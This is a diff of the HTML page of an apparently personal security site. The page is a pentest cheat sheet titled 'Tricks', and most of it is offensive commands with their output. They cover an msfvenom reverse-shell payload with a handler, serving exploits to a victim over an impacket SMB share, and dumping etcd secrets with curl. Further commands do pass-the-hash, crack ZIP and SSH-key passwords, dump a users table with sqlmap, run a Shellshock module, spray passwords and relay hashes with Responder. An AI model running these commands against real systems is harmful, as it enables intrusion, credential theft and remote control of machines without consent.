@@ -4,26 +4,50 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
 
     <meta name="author" content="d47zm3">
-    <meta name="description" content="Personal DevOps &amp; Security Site">
+    <meta name="description" content="Everything that doesn&rsquo;t fit to one category.
+rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share.
+rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0.">
     <meta name="keywords" content="blog,devops,personal,security">
 
-    <base href="https://d47zm3.me">
+    
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Tricks"/>
+<meta name="twitter:description" content="Everything that doesn&rsquo;t fit to one category.
+rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share.
+rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0."/>
+
+    <meta property="og:title" content="Tricks" />
+<meta property="og:description" content="Everything that doesn&rsquo;t fit to one category.
+rdesktop – sharing directory between attacker/victim, works with pivoting Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share.
+rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch keys, secrets, etc. curl http://:2379/v2/keys/?recursive=true share exploits over samba to windows machine # git-clone recent version! bastard/custom - [master●] » impacket-smbserver hacker $( pwd ) Impacket v0." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d47zm3.me/resources/infosec/tricks/" />
+
+
+
+    
+      <base href="https://d47zm3.me/resources/infosec/tricks/">
+    
     <title>
   Tricks · d47zm3
 </title>
 
-    <link rel="canonical" href="https://d47zm3.me/resources/infosec/tricks/">
+    
+      <link rel="canonical" href="https://d47zm3.me/resources/infosec/tricks/">
+    
 
-    <link href="https://fonts.googleapis.com/css?family=Lato:400,700|Merriweather:300,700|Source+Code+Pro:400,700" rel="stylesheet">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" integrity="sha256-oSrCnRYXvHG31SBifqP2PM1uje7SJUyX0nTwO2RJV54=" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
 
     
       
       
-      <link rel="stylesheet" href="https://d47zm3.me/css/coder.min.42b57c75b1d9e2f7bcc89c4031716ec188e0a0e63dbde8150859ed6ad58763ec.css" integrity="sha256-QrV8dbHZ4ve8yJxAMXFuwYjgoOY9vegVCFntatWHY&#43;w=" crossorigin="anonymous" media="screen" />
+      <link rel="stylesheet" href="https://d47zm3.me/css/coder.min.3219ef62ae52679b7a9c19043171c3cd9f523628c2a65f3ef247ee18836bc90b.css" integrity="sha256-MhnvYq5SZ5t6nBkEMXHDzZ9SNijCpl8&#43;8kfuGINryQs=" crossorigin="anonymous" media="screen" />
     
 
     
@@ -31,24 +55,29 @@
     
 
     
-      <link rel="stylesheet" href="https://d47zm3.me/css/custom.css">
+      <link rel="stylesheet" href="https://d47zm3.me/css/custom.css" />
+    
+
     
 
     <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://d47zm3.me/img/favicon-16x16.png" sizes="16x16">
 
-    
-
-    <meta name="generator" content="Hugo 0.57.2" />
+    <meta name="generator" content="Hugo 0.65.3" />
   </head>
 
-  <body class=" ">
+  
+  
+  <body class="colorscheme-light"
+        onload=""
+  >
     <main class="wrapper">
       <nav class="navigation">
   <section class="container">
-    <a class="navigation-title" href="https://d47zm3.me">
-      
+    <a class="navigation-title" href="https://d47zm3.me/">
+      d47zm3
     </a>
+    
     <input type="checkbox" id="menu-toggle" />
     <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
     <ul class="navigation-list">
@@ -59,15 +88,7 @@
           </li>
         
           <li class="navigation-item">
-            <a class="navigation-link" href="https://d47zm3.me/projects/">Projects</a>
-          </li>
-        
-          <li class="navigation-item">
             <a class="navigation-link" href="https://d47zm3.me/resources/">Resources</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://d47zm3.me/bookmarks/">Bookmarks</a>
           </li>
         
           <li class="navigation-item">
@@ -77,6 +98,7 @@
       
       
     </ul>
+    
   </section>
 </nav>
 
@@ -89,18 +111,14 @@
       <h1>Tricks</h1>
     </header>
 
-    
-
-<p>Everything that doesn&rsquo;t fit to one category.</p>
-
-<h3 id="rdesktop-sharing-directory-between-attacker-victim-works-with-pivoting">rdesktop – sharing directory between attacker/victim, works with pivoting</h3>
-
+    <p>Everything that doesn&rsquo;t fit to one category.</p>
+<h3 id="rdesktop--sharing-directory-between-attackervictim-works-with-pivoting">rdesktop – sharing directory between attacker/victim, works with pivoting</h3>
 <p>Recently discovered very nice way of sharing files for Windows machines with RDP, local dir exploits/ in current location will be available as share.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rdesktop -uname -peasypassword -r disk:share<span style="color:#f92672">=</span>exploits/ <span style="color:#ae81ff">10</span>.2.2.1</code></pre></div>
-<h3 id="etcd-fetch-keys-secrets-etc">etcd - fetch keys, secrets, etc.</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">curl http://:2379/v2/keys/?recursive=true</pre></div>
-<h3 id="share-exploits-over-samba-to-windows-machine">share exploits over samba to windows machine</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"># git-clone recent version!
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rdesktop -uname -peasypassword -r disk:share<span style="color:#f92672">=</span>exploits/ 10.2.2.1
+</code></pre></div><h3 id="etcd---fetch-keys-secrets-etc">etcd - fetch keys, secrets, etc.</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">curl http://:2379/v2/keys/?recursive=true
+</code></pre></div><h3 id="share-exploits-over-samba-to-windows-machine">share exploits over samba to windows machine</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># git-clone recent version!
 bastard/custom - [master●] » impacket-smbserver hacker $( pwd )
 Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 
@@ -126,18 +144,18 @@ Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 ... victim ...
 
 c:\Users\dimitris\Desktop&gt;\\10.10.16.10\MS10-059.exe
-\\10.10.16.10\MS10-059.exe</pre></div>
-<h3 id="windows-alternative-data-streams">windows - alternative data streams</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"># find
+\\10.10.16.10\MS10-059.exe
+</code></pre></div><h3 id="windows---alternative-data-streams">windows - alternative data streams</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># find
 dir   /s /r | find &#34;:$DATA&#34;
 # view
 c:\Users\Administrator\Desktop&gt;more &lt; clear.txt:hidden.txt
 more &lt; clear.txt:hidden.txt
-HIDDEN_DATA</pre></div>
-<h3 id="pass-the-hash-alternative-to-psexec-smb-metasploit">pass the hash – alternative to psexec smb (metasploit)</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">pth-winexe -U machine/Administrator%LMHash:NTLMHash //machine cmd.exe</pre></div>
-<h3 id="cracking-zips-pdfs-on-kali">cracking zips/pdfs on kali</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u -v  file.zip
+HIDDEN_DATA
+</code></pre></div><h3 id="pass-the-hash--alternative-to-psexec-smb-metasploit">pass the hash – alternative to psexec smb (metasploit)</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">pth-winexe -U machine/Administrator%LMHash:NTLMHash //machine cmd.exe
+</code></pre></div><h3 id="cracking-zipspdfs-on-kali">cracking zips/pdfs on kali</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u -v  file.zip
 found file &#39;pass.txt&#39;, (size cp/uc    198/   729, flags 9, chk 8d9c)
 
 
@@ -158,9 +176,9 @@ O: 702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c
 Average Speed: 41523.3 w/s. Current Word: &#39;parisy&#39;
 Average Speed: 41640.9 w/s. Current Word: &#39;joeybo&#39;
 ...
-found user-password: &#39;itworks&#39;</pre></div>
-<h3 id="generating-payload-with-msfvenom-and-using-it-with-handler">generating payload with msfvenom and using it with handler</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf &gt; shell.elf
+found user-password: &#39;itworks&#39;
+</code></pre></div><h3 id="generating-payload-with-msfvenom-and-using-it-with-handler">generating payload with msfvenom and using it with handler</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf &gt; shell.elf
 
 # upload to victim
 
@@ -174,9 +192,9 @@ msf exploit(handler) &gt; run
 # execute
 
 sessions -l
-sessions -i ID etc..</pre></div>
-<h3 id="enumerating-with-sqlmap">enumerating with sqlmap</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"># check if there&#39;s even a vulnerability
+sessions -i ID etc..
+</code></pre></div><h3 id="enumerating-with-sqlmap">enumerating with sqlmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># check if there&#39;s even a vulnerability
 sqlmap -u &#34;https://admin-portal.vulnerable.site/login.php&#34; --data=&#34;email=admin@vulnerable.site&amp;password=password&#34;
 # check existing databases
 sqlmap -u &#34;https://admin-portal.vulnerable.site/login.php&#34; --data=&#34;email=admin%40vulnerable.site&amp;password=password&#34; --dbs
@@ -185,65 +203,94 @@ sqlmap -u &#34;https://admin-portal.vulnerable.site/login.php&#34; --data=&#34;e
 # check columns in users table
 sqlmap -u &#34;https://admin-portal.vulnerable.site/login.php&#34; --data=&#34;email=admin%40vulnerable.site&amp;password=password&#34; -D admin -T users --columns
 # dump values in that table
-sqlmap -u &#34;https://admin-portal.vulnerable.site/login.php&#34; --data=&#34;email=admin%40vulnerable.site&amp;password=password&#34; -D admin -T users C email,username,password --dump</pre></div>
-<h3 id="exploiting-shellshock-with-metasploit">exploiting shellshock with metasploit</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">msf &gt; use auxiliary/scanner/http/apache_mod_cgi_bash_env
+sqlmap -u &#34;https://admin-portal.vulnerable.site/login.php&#34; --data=&#34;email=admin%40vulnerable.site&amp;password=password&#34; -D admin -T users C email,username,password --dump
+</code></pre></div><h3 id="exploiting-shellshock-with-metasploit">exploiting shellshock with metasploit</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msf &gt; use auxiliary/scanner/http/apache_mod_cgi_bash_env
 msf auxiliary(apache_mod_cgi_bash_env) &gt; set TARGETURI /cgi-bin/script.sh
 TARGETURI =&gt; /cgi-bin/script.sh
 msf auxiliary(apache_mod_cgi_bash_env) &gt; set RHOSTS 192.168.56.100
 RHOSTS =&gt; 192.168.56.100
-msf auxiliary(apache_mod_cgi_bash_env) &gt; exploit</pre></div>
-<h3 id="cracking-private-key-password">cracking private key password</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">ssh2john id_rsa &gt; crackme
-zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules crackme</pre></div>
-<h3 id="have-creds-on-a-local-network-but-no-shell-yet-bloodhound-getting-blocked">have creds on a local network but no shell yet? bloodhound getting blocked?</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&gt; pip install ldap3 dnspython ldapdomaindump
+msf auxiliary(apache_mod_cgi_bash_env) &gt; exploit
+</code></pre></div><h3 id="cracking-private-key-password">cracking private key password</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ssh2john id_rsa &gt; crackme
+zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules crackme
+</code></pre></div><h3 id="have-creds-on-a-local-network-but-no-shell-yet-bloodhound-getting-blocked">have creds on a local network but no shell yet? bloodhound getting blocked?</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&gt; pip install ldap3 dnspython ldapdomaindump
 &gt; ldapdomaindump -u &#34;DOMAIN\user&#34; 192.168.0.1
-# read all users/groups/computers/policies in the domain in HTML.</pre></div>
-<h3 id="larger-dataset-for-default-credentials-for-nmap">larger dataset for default credentials for nmap</h3>
-
+# read all users/groups/computers/policies in the domain in HTML.
+</code></pre></div><h3 id="larger-dataset-for-default-credentials-for-nmap">larger dataset for default credentials for nmap</h3>
 <ul>
 <li><a href="https://github.com/nnposter/nndefaccts">https://github.com/nnposter/nndefaccts</a></li>
 </ul>
-
-<h3 id="need-creds-on-an-int-ext-network-found-cisco-vpn-lync-owa-or-smb">need creds on an int/ext network? found cisco vpn, lync, owa or smb?</h3>
-
-<p>1) Free API key on <a href="http://hunter.io">http://hunter.io</a></p>
-
-<p>2) Import to InSpy</p>
-
-<p>3) ./InSpy $comp (may need more flags)</p>
-
-<p>4) Export usernames</p>
-
-<p>5) Create file with passwords like: seasonyear company123</p>
-
-<p>6) Run Spray (SpiderLabs/Spray)</p>
-
-<h3 id="having-trouble-getting-a-foothold-can-t-crack-ntlmv1-v2-hashes">having trouble getting a foothold?  can&rsquo;t crack ntlmv1/v2 hashes?</h3>
-
+<h3 id="need-creds-on-an-intext-network-found-cisco-vpn-lync-owa-or-smb">need creds on an int/ext network? found cisco vpn, lync, owa or smb?</h3>
+<ol>
+<li>
+<p>Free API key on <a href="http://hunter.io">http://hunter.io</a></p>
+</li>
+<li>
+<p>Import to InSpy</p>
+</li>
+<li>
+<p>./InSpy $comp (may need more flags)</p>
+</li>
+<li>
+<p>Export usernames</p>
+</li>
+<li>
+<p>Create file with passwords like: seasonyear company123</p>
+</li>
+<li>
+<p>Run Spray (SpiderLabs/Spray)</p>
+</li>
+</ol>
+<h3 id="having-trouble-getting-a-foothold--cant-crack-ntlmv1v2-hashes">having trouble getting a foothold?  can&rsquo;t crack ntlmv1/v2 hashes?</h3>
 <p>Configure Responder to redirect user auth. In responder.conf, set SMB,HTTP and HTTPS to OFF in the list of servers to start, then:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">python http://MultiRelay.py  -t &lt;TARGET_IP&gt; -u ALL 
-responder -I eth0 -v</pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python http://MultiRelay.py  -t &lt;TARGET_IP&gt; -u ALL 
+responder -I eth0 -v
+</code></pre></div>
   </article>
 </section>
 
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
 
       </div>
 
-      <footer class="footer">
-  <section class="container">
-    
-     © 2019
-    
-       · 
-      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
-    
-    
-  </section>
-</footer>
+      
+  <footer class="footer">
+    <section class="container">
+      
+      
+        ©
+        
+        2020
+         d47zm3 
+      
+      
+      
+    </section>
+  </footer>
 
     </main>
+
+    
+
+    
 
     
 
